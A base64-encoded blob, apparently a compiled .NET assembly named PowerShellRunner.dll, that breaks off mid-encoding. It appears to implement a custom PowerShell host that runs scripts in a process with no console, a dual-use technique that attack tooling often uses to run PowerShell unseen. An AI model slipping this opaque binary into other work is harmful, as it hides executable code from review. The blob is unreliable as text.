Z0NKQUZFQ1FRQ1JBT2tIUmdCeEFZd0pFQUFNQUlvRlZBQjVBUVFKV2dCeEFhUUFFQUNSQUhFQlpBQ0pBWWdDQmdDWkFDUUFiUUI1QU5BSEJnQ3BBTkFIY2dDUkFaSUFlQUNSQVhVQ2ZnQ1JBV0FDZmdDWkFkQUhFQUNoQUtnQWd3Q1pBTkFIQmdDeEFOQUhCZ0RCQU5BSEJnREJBTUFBaUFDaEFWVUpqZ0RCQVB3QmlBQjVBQWNGbEFBcEFSQUZBUUFwQVdVSkFRQXhBVDRBQVFBeEFVUUFBUUFaQWRBSEJnQXVBQXNBNFFFdUFCTUE2Z0V1QUJzQUNRSXVBQ01BRWdJdUFDc0FLQUl1QURNQUtBSXVBRHNBS0FJdUFFTUFFZ0l1QUVzQUxnSXVBRk1BS0FJdUFGc0FLQUl1QUdNQVJnSXVBR3NBY0FJYUFKZ0FBd0FCQUFRQUJ3QUZBQWtBQUFCMkFLb0JBQUR1QWE4QkFBQ3FCYk1CQUFBeUFMZ0JBQUI1QXIwQkFBQmtBcjBCQUFEc0NhOEJBQUF2QU1JQkFBQ2lCOGdCQUFBaUJNMEJBQUJYQnRNQkFBQk1CTmtCQUFCcEI4Z0JBQUI4QWQwQkFBQ0ZCTTBCQUFDMkJNMEJBQUNOQnRNQkFBRElCTTBCQUFDOUFhOEJBZ0FEQUFNQUFnQUVBQVVBQWdBRkFBY0FBZ0FHQUFrQUFnQUhBQXNBQWdBSUFBMEFBZ0FhQUE4QUFnQWZBQkVBQWdBaUFCTUFBUUFqQUJNQUFnQWtBQlVBQVFBbEFCVUFBZ0FtQUJjQUFRQW5BQmNBQWdBb0FCa0FBUUFwQUJrQUFnQXJBQnNBQVFBc0FCc0FBZ0F1QUIwQUFnQXZBQjhBQWdBd0FDRUFBZ0ExQUNNQUFRQTJBQ01BQWdBM0FDVUFBUUE0QUNVQUFnQTVBQ2NBQVFBNkFDY0FUQUFFZ0FBQUFRQUFBQUFBQUFBQUFBQUFBQUJBQndBQUFnQUFBQUFBQUFBQUFBQUFvUUJLQUFBQUFBQUJBQUFBQUFBQUFBQUFBQUNxQU40RkFBQUFBQU1BQWdBRUFBSUFCUUFDQUFBQUFFTnZiR3hsWTNScGIyNWdNUUJFYVdOMGFXOXVZWEo1WURJQVBFMXZaSFZzWlQ0QVoyVjBYMVZKQUdkbGRGOVNZWGRWU1FCSmJuWnZhMlZRVXdCelpYUmZXQUJ6WlhSZldRQnRjMk52Y214cFlnQmZjMklBVTNsemRHVnRMa052Ykd4bFkzUnBiMjV6TGtkbGJtVnlhV01BWjJWMFgwbHVjM1JoYm1ObFNXUUFjMjkxY21ObFNXUUFYMmh2YzNSSlpBQm5aWFJmUTNWeWNtVnVkRlJvY21WaFpBQkJaR1FBVG1WM1IzVnBaQUJEYjIxdFlXNWtBR052YlcxaGJtUUFRWEJ3Wlc1a0FGQnliMmR5WlhOelVtVmpiM0prQUhKbFkyOXlaQUJEZFhOMGIyMVFVMGh2YzNSVmMyVnlTVzUwWlhKbVlXTmxBRU4xYzNSdmJWQlRVa2h2YzNSU1lYZFZjMlZ5U1c1MFpYSm1ZV05sQUZCVFNHOXpkRkpoZDFWelpYSkpiblJsY21aaFkyVUFRM0psWVhSbFVuVnVjM0JoWTJVQVVISnZiWEIwUm05eVEyaHZhV05sQUdSbFptRjFiSFJEYUc5cFkyVUFjMjkxY21ObEFHVjRhWFJEYjJSbEFHMWxjM05oWjJVQVNXNTJiMnRsQUdkbGRGOUxaWGxCZG1GcGJHRmliR1VBU1VScGMzQnZjMkZpYkdVQVVtVmpkR0Z1WjJ4bEFISmxZM1JoYm1kc1pRQm5aWFJmVjJsdVpHOTNWR2wwYkdVQWMyVjBYMWRwYm1SdmQxUnBkR3hsQUY5M2FXNWtiM2RVYVhSc1pRQm5aWFJmVG1GdFpRQjFjMlZ5VG1GdFpRQjBZWEpuWlhST1lXMWxBRkpsWVdSTWFXNWxBRUZ3Y0dWdVpFeHBibVVBVjNKcGRHVldaWEppYjNObFRHbHVaUUJYY21sMFpVeHBibVVBVjNKcGRHVlhZWEp1YVc1blRHbHVaUUJYY21sMFpVUmxZblZuVEdsdVpRQlhjbWwwWlVWeWNtOXlUR2x1WlFCRGNtVmhkR1ZRYVhCbGJHbHVaUUJuWlhSZlEzVnljbVZ1ZEZWSlEzVnNkSFZ5WlFCblpYUmZRM1Z5Y21WdWRFTjFiSFIxY21VQVJHbHpjRzl6WlFCSmJtbDBhV0ZzVTJWemMybHZibE4wWVhSbEFITmxkRjlCY0dGeWRHMWxiblJUZEdGMFpRQlhjbWwwWlFCSGRXbGtRWFIwY21saWRYUmxBRVJsWW5WbloyRmliR1ZCZEhSeWFXSjFkR1VBUTI5dFZtbHphV0pzWlVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZScGRHeGxRWFIwY21saWRYUmxBRUZ6YzJWdFlteDVWSEpoWkdWdFlYSnJRWFIwY21saWRYUmxBRUZ6YzJWdFlteDVSbWxzWlZabGNuTnBiMjVCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxEYjI1bWFXZDFjbUYwYVc5dVFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVJHVnpZM0pwY0hScGIyNUJkSFJ5YVdKMWRHVUFRMjl0Y0dsc1lYUnBiMjVTWld4aGVHRjBhVzl1YzBGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZCeWIyUjFZM1JCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxEYjNCNWNtbG5hSFJCZEhSeWFXSjFkR1VBUVhOelpXMWliSGxEYjIxd1lXNTVRWFIwY21saWRYUmxBRkoxYm5ScGJXVkRiMjF3WVhScFltbHNhWFI1UVhSMGNtbGlkWFJsQUhaaGJIVmxBR2RsZEY5Q2RXWm1aWEpUYVhwbEFITmxkRjlDZFdabVpYSlRhWHBsQUY5aWRXWm1aWEpUYVhwbEFHZGxkRjlEZFhKemIzSlRhWHBsQUhObGRGOURkWEp6YjNKVGFYcGxBRjlqZFhKemIzSlRhWHBsQUdkbGRGOVhhVzVrYjNkVGFYcGxBSE5sZEY5WGFXNWtiM2RUYVhwbEFHZGxkRjlOWVhoUWFIbHphV05oYkZkcGJtUnZkMU5wZW1VQVgyMWhlRkJvZVhOcFkyRnNWMmx1Wkc5M1UybDZaUUJuWlhSZlRXRjRWMmx1Wkc5M1UybDZaUUJmYldGNFYybHVaRzkzVTJsNlpRQmZkMmx1Wkc5M1UybDZaUUJUZVhOMFpXMHVWR2h5WldGa2FXNW5BRkpsWVdSTWFXNWxRWE5UWldOMWNtVlRkSEpwYm1jQVZHOVRkSEpwYm1jQWMyVjBYMWRwWkhSb0FGOXlZWGRWYVFCZmRXa0FVRk5EY21Wa1pXNTBhV0ZzQUZCeWIyMXdkRVp2Y2tOeVpXUmxiblJwWVd3QVUzbHpkR1Z0TGtOdmJHeGxZM1JwYjI1ekxrOWlhbVZqZEUxdlpHVnNBRkJ2ZDJWeVUyaGxiR3hTZFc1dVpYSXVaR3hzQUVKMVptWmxja05sYkd3QVptbHNiQUJuWlhSZlNYUmxiUUJUZVhOMFpXMEFUM0JsYmdCdmNtbG5hVzRBWjJWMFgxWmxjbk5wYjI0QVRtOTBhV1o1Ulc1a1FYQndiR2xqWVhScGIyNEFUbTkwYVdaNVFtVm5hVzVCY0hCc2FXTmhkR2x2YmdCVGVYTjBaVzB1VFdGdVlXZGxiV1Z1ZEM1QmRYUnZiV0YwYVc5dUFHUmxjM1JwYm1GMGFXOXVBRk41YzNSbGJTNUhiRzlpWVd4cGVtRjBhVzl1QUZONWMzUmxiUzVTWldac1pXTjBhVzl1QUVOdmJXMWhibVJEYjJ4c1pXTjBhVzl1QUdkbGRGOURkWEp6YjNKUWIzTnBkR2x2YmdCelpYUmZRM1Z5YzI5eVVHOXphWFJwYjI0QVgyTjFjbk52Y2xCdmMybDBhVzl1QUdkbGRGOVhhVzVrYjNkUWIzTnBkR2x2YmdCelpYUmZWMmx1Wkc5M1VHOXphWFJwYjI0QVgzZHBibVJ2ZDFCdmMybDBhVzl1QUdOaGNIUnBiMjRBVG05MFNXMXdiR1Z0Wlc1MFpXUkZlR05sY0hScGIyNEFSbWxsYkdSRVpYTmpjbWx3ZEdsdmJnQkRhRzlwWTJWRVpYTmpjbWx3ZEdsdmJnQkRkV3gwZFhKbFNXNW1id0JMWlhsSmJtWnZBR05zYVhBQVUzUnlhVzVuUW5WcGJHUmxjZ0JHYkhWemFFbHVjSFYwUW5WbVptVnlBSE5sZEY5QmRYUm9iM0pwZW1GMGFXOXVUV0Z1WVdkbGNnQlFiM2RsY2xOb1pXeHNVblZ1Ym1WeUFHZGxkRjlHYjNKbFozSnZkVzVrUTI5c2IzSUFjMlYwWDBadmNtVm5jbTkxYm1SRGIyeHZjZ0JmWm05eVpXZHliM1Z1WkVOdmJHOXlBR2RsZEY5Q1lXTnJaM0p2ZFc1a1EyOXNiM0lBYzJWMFgwSmhZMnRuY205MWJtUkRiMnh2Y2dCZlltRmphMmR5YjNWdVpFTnZiRzl5QUVOdmJuTnZiR1ZEYjJ4dmNnQXVZM1J2Y2dCVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNQVoyVjBYME52YlcxaGJtUnpBRk41YzNSbGJTNU5ZVzVoWjJWdFpXNTBMa0YxZEc5dFlYUnBiMjR1VW5WdWMzQmhZMlZ6QUdOb2IybGpaWE1BVTNsemRHVnRMbEoxYm5ScGJXVXVTVzUwWlhKdmNGTmxjblpwWTJWekFGTjVjM1JsYlM1U2RXNTBhVzFsTGtOdmJYQnBiR1Z5VTJWeWRtbGpaWE1BUkdWaWRXZG5hVzVuVFc5a1pYTUFVRk5EY21Wa1pXNTBhV0ZzVkhsd1pYTUFZV3hzYjNkbFpFTnlaV1JsYm5ScFlXeFVlWEJsY3dCUWFYQmxiR2x1WlZKbGMzVnNkRlI1Y0dWekFFTnZiM0prYVc1aGRHVnpBRkJUUTNKbFpHVnVkR2xoYkZWSlQzQjBhVzl1Y3dCU1pXRmtTMlY1VDNCMGFXOXVjd0JrWlhOamNtbHdkR2x2Ym5NQWIzQjBhVzl1Y3dCWGNtbDBaVkJ5YjJkeVpYTnpBRTFsY21kbFRYbFNaWE4xYkhSekFGTmpjbTlzYkVKMVptWmxja052Ym5SbGJuUnpBRWRsZEVKMVptWmxja052Ym5SbGJuUnpBRk5sZEVKMVptWmxja052Ym5SbGJuUnpBR052Ym5SbGJuUnpBRU52Ym1OaGRBQlFVMDlpYW1WamRBQnpaWFJmU0dWcFoyaDBBRk5sZEZOb2IzVnNaRVY0YVhRQVEzSmxZWFJsUkdWbVlYVnNkQUJCWkdSVFkzSnBjSFFBUlc1MFpYSk9aWE4wWldSUWNtOXRjSFFBUlhocGRFNWxjM1JsWkZCeWIyMXdkQUJUZVhOMFpXMHVUV0Z1WVdkbGJXVnVkQzVCZFhSdmJXRjBhVzl1TGtodmMzUUFRM1Z6ZEc5dFVGTkliM04wQUdkbGRGOVBkWFJ3ZFhRQVUzbHpkR1Z0TGxSbGVIUUFVbVZoWkV0bGVRQlNkVzV6Y0dGalpVWmhZM1J2Y25rQVUzbHpkR1Z0TGxObFkzVnlhWFI1QUFBQUYyOEFkUUIwQUMwQVpBQmxBR1lBWVFCMUFHd0FkQUFCRjBNQWJ3QnVBSE1BYndCc0FHVUFTQUJ2QUhNQWRBQUFnWGRGQUc0QWRBQmxBSElBVGdCbEFITUFkQUJsQUdRQVVBQnlBRzhBYlFCd0FIUUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUNBQUlBQlVBR2dBWlFBZ0FITUFZd0J5QUdrQWNBQjBBQ0FBYVFCekFDQUFZUUJ6QUdzQWFRQnVBR2NBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBc0FDQUFkd0JvQUdrQVl3Qm9BQ0FBYVFCekFDQUFZUUFnQUhBQWNnQnZBR0lBYkFCbEFHMEFJQUJ6QUdrQWJnQmpBR1VBSUFCMEFHZ0FaUUJ5QUdVQUp3QnpBQ0FBYmdCdkFDQUFZd0J2QUc0QWN3QnZBR3dBWlFBdUFDQUFJQUJOQUdFQWF3QmxBQ0FBY3dCMUFISUFaUUFnQUhRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQmpBR0VBYmdBZ0FHVUFlQUJsQUdNQWRRQjBBR1VBSUFCM0FHa0FkQUJvQUc4QWRRQjBBQ0FBY0FCeUFHOEFiUUJ3QUhRQWFRQnVBR2NBSUFCMEFHZ0FaUUFnQUhVQWN3QmxBSElBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBdUFBR0JkVVVBZUFCcEFIUUFUZ0JsQUhNQWRBQmxBR1FBVUFCeUFHOEFiUUJ3QUhRQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFFRENnQUFEMFFBUlFCQ0FGVUFSd0E2QUNBQUFBOUZBRklBVWdCUEFGSUFPZ0FnQUFBVFZnQkZBRklBUWdCUEFGTUFSUUE2QUNBQUFCTlhBRUVBVWdCT0FFa0FUZ0JIQURvQUlBQUFnV0ZRQUhJQWJ3QnRBSEFBZEFBZ0FHa0Fjd0FnQUc0QWJ3QjBBQ0FBYVFCdEFIQUFiQUJsQUcwQVpRQnVBSFFBWlFCa0FDNEFJQUFnQUZRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQnBBSE1BSUFCaEFITUFhd0JwQUc0QVp3QWdBR1lBYndCeUFDQUFhUUJ1QUhBQWRRQjBBQ3dBSUFCM0FHZ0FhUUJqQUdnQUlBQnBBSE1BSUFCaEFDQUFjQUJ5QUc4QVlnQnNBR1VBYlFBZ0FITUFhUUJ1QUdNQVpRQWdBSFFBYUFCbEFISUFaUUFuQUhNQUlBQnVBRzhBSUFCakFHOEFiZ0J6QUc4QWJBQmxBQzRBSUFBZ0FFMEFZUUJyQUdVQUlBQnpBSFVBY2dCbEFDQUFkQUJvQUdVQUlBQnpBR01BY2dCcEFIQUFkQUFnQUdNQVlRQnVBQ0FBWlFCNEFHVUFZd0IxQUhRQVpRQWdBSGNBYVFCMEFHZ0Fid0IxQUhRQUlBQndBSElBYndCdEFIQUFkQUJwQUc0QVp3QWdBSFFBYUFCbEFDQUFkUUJ6QUdVQWNnQWdBR1lBYndCeUFDQUFhUUJ1QUhBQWRRQjBBQzRBQVlGelVBQnlBRzhBYlFCd0FIUUFSZ0J2QUhJQVF3Qm9BRzhBYVFCakFHVUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUNBQUlBQlVBR2dBWlFBZ0FITUFZd0J5QUdrQWNBQjBBQ0FBYVFCekFDQUFZUUJ6QUdzQWFRQnVBR2NBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBc0FDQUFkd0JvQUdrQVl3Qm9BQ0FBYVFCekFDQUFZUUFnQUhBQWNnQnZBR0lBYkFCbEFHMEFJQUJ6QUdrQWJnQmpBR1VBSUFCMEFHZ0FaUUJ5QUdVQUp3QnpBQ0FBYmdCdkFDQUFZd0J2QUc0QWN3QnZBR3dBWlFBdUFDQUFJQUJOQUdFQWF3QmxBQ0FBY3dCMUFISUFaUUFnQUhRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQmpBR0VBYmdBZ0FHVUFlQUJsQUdNQWRRQjBBR1VBSUFCM0FHa0FkQUJvQUc4QWRRQjBBQ0FBY0FCeUFHOEFiUUJ3QUhRQWFRQnVBR2NBSUFCMEFHZ0FaUUFnQUhVQWN3QmxBSElBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBdUFBR0JmVkFBY2dCdkFHMEFjQUIwQUVZQWJ3QnlBRU1BY2dCbEFHUUFaUUJ1QUhRQWFRQmhBR3dBTVFBZ0FHa0Fjd0FnQUc0QWJ3QjBBQ0FBYVFCdEFIQUFiQUJsQUcwQVpRQnVBSFFBWlFCa0FDNEFJQUFnQUZRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQnBBSE1BSUFCaEFITUFhd0JwQUc0QVp3QWdBR1lBYndCeUFDQUFhUUJ1QUhBQWRRQjBBQ3dBSUFCM0FHZ0FhUUJqQUdnQUlBQnBBSE1BSUFCaEFDQUFjQUJ5QUc4QVlnQnNBR1VBYlFBZ0FITUFhUUJ1QUdNQVpRQWdBSFFBYUFCbEFISUFaUUFuQUhNQUlBQnVBRzhBSUFCakFHOEFiZ0J6QUc4QWJBQmxBQzRBSUFBZ0FFMEFZUUJyQUdVQUlBQnpBSFVBY2dCbEFDQUFkQUJvQUdVQUlBQnpBR01BY2dCcEFIQUFkQUFnQUdNQVlRQnVBQ0FBWlFCNEFHVUFZd0IxQUhRQVpRQWdBSGNBYVFCMEFHZ0Fid0IxQUhRQUlBQndBSElBYndCdEFIQUFkQUJwQUc0QVp3QWdBSFFBYUFCbEFDQUFkUUJ6QUdVQWNnQWdBR1lBYndCeUFDQUFhUUJ1QUhBQWRRQjBBQzRBQVlGOVVBQnlBRzhBYlFCd0FIUUFSZ0J2QUhJQVF3QnlBR1VBWkFCbEFHNEFkQUJwQUdFQWJBQXlBQ0FBYVFCekFDQUFiZ0J2QUhRQUlBQnBBRzBBY0FCc0FHVUFiUUJsQUc0QWRBQmxBR1FBTGdBZ0FDQUFWQUJvQUdVQUlBQnpBR01BY2dCcEFIQUFkQUFnQUdrQWN3QWdBR0VBY3dCckFHa0FiZ0JuQUNBQVpnQnZBSElBSUFCcEFHNEFjQUIxQUhRQUxBQWdBSGNBYUFCcEFHTUFhQUFnQUdrQWN3QWdBR0VBSUFCd0FISUFid0JpQUd3QVpRQnRBQ0FBY3dCcEFHNEFZd0JsQUNBQWRBQm9BR1VBY2dCbEFDY0Fjd0FnQUc0QWJ3QWdBR01BYndCdUFITUFid0JzQUdVQUxnQWdBQ0FBVFFCaEFHc0FaUUFnQUhNQWRRQnlBR1VBSUFCMEFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFZd0JoQUc0QUlBQmxBSGdBWlFCakFIVUFkQUJsQUNBQWR3QnBBSFFBYUFCdkFIVUFkQUFnQUhBQWNnQnZBRzBBY0FCMEFHa0FiZ0JuQUNBQWRBQm9BR1VBSUFCMUFITUFaUUJ5QUNBQVpnQnZBSElBSUFCcEFHNEFjQUIxQUhRQUxnQUJnV1ZTQUdVQVlRQmtBRXdBYVFCdUFHVUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUNBQUlBQlVBR2dBWlFBZ0FITUFZd0J5QUdrQWNBQjBBQ0FBYVFCekFDQUFZUUJ6QUdzQWFRQnVBR2NBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBc0FDQUFkd0JvQUdrQVl3Qm9BQ0FBYVFCekFDQUFZUUFnQUhBQWNnQnZBR0lBYkFCbEFHMEFJQUJ6QUdrQWJnQmpBR1VBSUFCMEFHZ0FaUUJ5QUdVQUp3QnpBQ0FBYmdCdkFDQUFZd0J2QUc0QWN3QnZBR3dBWlFBdUFDQUFJQUJOQUdFQWF3QmxBQ0FBY3dCMUFISUFaUUFnQUhRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQmpBR0VBYmdBZ0FHVUFlQUJsQUdNQWRRQjBBR1VBSUFCM0FHa0FkQUJvQUc4QWRRQjBBQ0FBY0FCeUFHOEFiUUJ3QUhRQWFRQnVBR2NBSUFCMEFHZ0FaUUFnQUhVQWN3QmxBSElBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBdUFBR0JnVklBWlFCaEFHUUFUQUJwQUc0QVpRQkJBSE1BVXdCbEFHTUFkUUJ5QUdVQVV3QjBBSElBYVFCdUFHY0FJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUNBQUlBQlVBR2dBWlFBZ0FITUFZd0J5QUdrQWNBQjBBQ0FBYVFCekFDQUFZUUJ6QUdzQWFRQnVBR2NBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBc0FDQUFkd0JvQUdrQVl3Qm9BQ0FBYVFCekFDQUFZUUFnQUhBQWNnQnZBR0lBYkFCbEFHMEFJQUJ6QUdrQWJnQmpBR1VBSUFCMEFHZ0FaUUJ5QUdVQUp3QnpBQ0FBYmdCdkFDQUFZd0J2QUc0QWN3QnZBR3dBWlFBdUFDQUFJQUJOQUdFQWF3QmxBQ0FBY3dCMUFISUFaUUFnQUhRQWFBQmxBQ0FBY3dCakFISUFhUUJ3QUhRQUlBQmpBR0VBYmdBZ0FHVUFlQUJsQUdNQWRRQjBBR1VBSUFCM0FHa0FkQUJvQUc4QWRRQjBBQ0FBY0FCeUFHOEFiUUJ3QUhRQWFRQnVBR2NBSUFCMEFHZ0FaUUFnQUhVQWN3QmxBSElBSUFCbUFHOEFjZ0FnQUdrQWJnQndBSFVBZEFBdUFBRkpSZ0JzQUhVQWN3Qm9BRWtBYmdCd0FIVUFkQUJDQUhVQVpnQm1BR1VBY2dBZ0FHa0Fjd0FnQUc0QWJ3QjBBQ0FBYVFCdEFIQUFiQUJsQUcwQVpRQnVBSFFBWlFCa0FDNEFBRXRIQUdVQWRBQkNBSFVBWmdCbUFHVUFjZ0JEQUc4QWJnQjBBR1VBYmdCMEFITUFJQUJwQUhNQUlBQnVBRzhBZEFBZ0FHa0FiUUJ3QUd3QVpRQnRBR1VBYmdCMEFHVUFaQUF1QUFCQlN3QmxBSGtBUVFCMkFHRUFhUUJzQUdFQVlnQnNBR1VBSUFCcEFITUFJQUJ1QUc4QWRBQWdBR2tBYlFCd0FHd0FaUUJ0QUdVQWJnQjBBR1VBWkFBdUFBQ0JZMUlBWlFCaEFHUUFTd0JsQUhrQUlBQnBBSE1BSUFCdUFHOEFkQUFnQUdrQWJRQndBR3dBWlFCdEFHVUFiZ0IwQUdVQVpBQXVBQ0FBSUFCVUFHZ0FaUUFnQUhNQVl3QnlBR2tBY0FCMEFDQUFhUUJ6QUNBQVlRQnpBR3NBYVFCdUFHY0FJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUFzQUNBQWR3Qm9BR2tBWXdCb0FDQUFhUUJ6QUNBQVlRQWdBSEFBY2dCdkFHSUFiQUJsQUcwQUlBQnpBR2tBYmdCakFHVUFJQUIwQUdnQVpRQnlBR1VBSndCekFDQUFiZ0J2QUNBQVl3QnZBRzRBY3dCdkFHd0FaUUF1QUNBQUlBQk5BR0VBYXdCbEFDQUFjd0IxQUhJQVpRQWdBSFFBYUFCbEFDQUFjd0JqQUhJQWFRQndBSFFBSUFCakFHRUFiZ0FnQUdVQWVBQmxBR01BZFFCMEFHVUFJQUIzQUdrQWRBQm9BRzhBZFFCMEFDQUFjQUJ5QUc4QWJRQndBSFFBYVFCdUFHY0FJQUIwQUdnQVpRQWdBSFVBY3dCbEFISUFJQUJtQUc4QWNnQWdBR2tBYmdCd0FIVUFkQUF1QUFGUFV3QmpBSElBYndCc0FHd0FRZ0IxQUdZQVpnQmxBSElBUXdCdkFHNEFkQUJsQUc0QWRBQnpBQ0FBYVFCekFDQUFiZ0J2QUhRQUlBQnBBRzBBY0FCc0FHVUFiUUJsQUc0QWRBQmxBR1FBQUV0VEFHVUFkQUJDQUhVQVpnQm1BR1VBY2dCREFHOEFiZ0IwQUdVQWJnQjBBSE1BSUFCcEFITUFJQUJ1QUc4QWRBQWdBR2tBYlFCd0FHd0FaUUJ0QUdVQWJnQjBBR1VBWkFBdUFBQkpVd0JsQUhRQVFnQjFBR1lBWmdCbEFISUFRd0J2QUc0QWRBQmxBRzRBZEFCekFDQUFhUUJ6QUNBQWJnQnZBSFFBSUFCcEFHMEFjQUJzQUdVQWJRQmxBRzRBZEFCbEFHUUFBQUVBQUFETU9qTDRzZnAvUktvaGFmVHU1MTArQUFRZ0FRRUlBeUFBQVFVZ0FRRVJFUVFnQVFFT0JDQUJBUUlLQndRU0RCSkJFa1VTU1FRQUFCSkJCaUFCQVJHQXJRWWdBUUVTZ0xFSUFBSVNSUkpORWtFRUlBQVNTUVVnQUJLQXVRY1ZFblVCRW9DOUJTQUJFd0FJQ1NBQ0FSR0F3UkdBd1FnZ0FCVVNkUUVTY1FRZ0FCSlpCU0FDQVFnSUJRQUFFb0RKQkNBQUVsMEVBQUFSVVFVZ0FSSmhEZ1VBQWc0T0RnTWdBQTRJQndJUmdKVVJnSmtJdDNwY1ZoazA0SWtJTWI4NFZxMDJUalVEQmhGUkF3WVNFQU1HRW1FREJoSVVCQVlSZ0pVRUJoR0FtUUlHQ0FNR0VXVUNCZzRFQUFFT0RnUWdBQkZSQkNBQUVsVUlJQU1CRVdVUlpRNEdJQUlCQ2hKcEVTQURGUkp0QWc0U2NRNE9GUkoxQVJKNURDQUVDQTRPRlJKMUFSSjlDQThnQmhLQWdRNE9EZzRSZ0lVUmdJa0pJQVFTZ0lFT0RnNE9CU0FBRW9DTkJTQUFFb0NSQkNBQUVXVUZJQUVCRVdVRklBQVJnSlVHSUFFQkVZQ1ZCU0FBRVlDWkJpQUJBUkdBbVFNZ0FBZ09JQUVVRVlDZEFnQUNBQUFSZ0tFRElBQUNDQ0FCRVlDbEVZQ3BEeUFFQVJHQW9SR0FtUkdBb1JHQW5Ra2dBZ0VSZ0tFUmdKMFBJQUlCRVlDWkZCR0FuUUlBQWdBQUJDZ0FFVkVES0FBT0JDZ0FFbFVFS0FBU1dRUW9BQkpkQlNnQUVvQ05CQ2dBRVdVRktBQVJnSlVGS0FBUmdKa0RLQUFJQXlnQUFnZ0JBQWdBQUFBQUFCNEJBQUVBVkFJV1YzSmhjRTV2YmtWNFkyVndkR2x2YmxSb2NtOTNjd0VJQVFBQ0FBQUFBQUFWQVFBUVVHOTNaWEpUYUdWc2JGSjFibTVsY2dBQUJRRUFBQUFBRndFQUVrTnZjSGx5YVdkb2RDRENxU0FnTWpBeE5BQUFLUUVBSkdSbVl6UmxaV0ppTFRjek9EUXROR1JpTlMwNVltRmtMVEkxTnpJd016QXlPV0prT1FBQURBRUFCekV1TUM0d0xqQUFBQUFBQUt4S0FBQUFBQUFBQUFBQUFNWktBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQzRTZ0FBQUFBQUFBQUFBQUFBQUY5RGIzSkViR3hOWVdsdUFHMXpZMjl5WldVdVpHeHNBQUFBQUFEL0pRQWdBQklBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUVBQUFBd0FBQ0FBQUFBQUFBQUFBQUFBQUFBQUFBQkFBQUFBQUJJQUFBQVdHQUFBRndEQUFBQUFBQUFBQUFBQUZ3RE5BQUFBRllBVXdCZkFGWUFSUUJTQUZNQVNRQlBBRTRBWHdCSkFFNEFSZ0JQQUFBQUFBQzlCTy8rQUFBQkFBQUFBUUFBQUFBQUFBQUJBQUFBQUFBL0FBQUFBQUFBQUFRQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFBQVJBQUFBQUVBVmdCaEFISUFSZ0JwQUd3QVpRQkpBRzRBWmdCdkFBQUFBQUFrQUFRQUFBQlVBSElBWVFCdUFITUFiQUJoQUhRQWFRQnZBRzRBQUFBQUFBQUFzQVM4QWdBQUFRQlRBSFFBY2dCcEFHNEFad0JHQUdrQWJBQmxBRWtBYmdCbUFHOEFBQUNZQWdBQUFRQXdBREFBTUFBd0FEQUFOQUJpQURBQUFBQWFBQUVBQVFCREFHOEFiUUJ0QUdVQWJnQjBBSE1BQUFBQUFBQUFJZ0FCQUFFQVF3QnZBRzBBY0FCaEFHNEFlUUJPQUdFQWJRQmxBQUFBQUFBQUFBQUFTZ0FSQUFFQVJnQnBBR3dBWlFCRUFHVUFjd0JqQUhJQWFRQndBSFFBYVFCdkFHNEFBQUFBQUZBQWJ3QjNBR1VBY2dCVEFHZ0FaUUJzQUd3QVVnQjFBRzRBYmdCbEFISUFBQUFBQURBQUNBQUJBRVlBYVFCc0FHVUFWZ0JsQUhJQWN3QnBBRzhBYmdBQUFBQUFNUUF1QURBQUxnQXdBQzRBTUFBQUFFb0FGUUFCQUVrQWJnQjBBR1VBY2dCdUFHRUFiQUJPQUdFQWJRQmxBQUFBVUFCdkFIY0FaUUJ5QUZNQWFBQmxBR3dBYkFCU0FIVUFiZ0J1QUdVQWNnQXVBR1FBYkFCc0FBQUFBQ